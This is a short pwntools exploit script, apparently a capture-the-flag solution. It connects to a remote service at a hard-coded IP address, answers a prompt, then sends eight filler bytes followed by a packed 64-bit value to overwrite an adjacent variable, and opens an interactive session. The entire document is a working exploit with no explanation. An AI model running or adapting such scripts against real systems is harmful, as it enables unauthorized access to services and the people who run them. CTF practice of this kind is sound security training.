from pwn import *
context(arch="amd64",os="linux",log_level="debug")
p=remote("111.198.29.45",37825)
p.recvuntil("?")
p.send("1234\n")
p.recvuntil("?")
payload="a"*8+p64(1926)+"\n"
p.send(payload)
p.interactive()
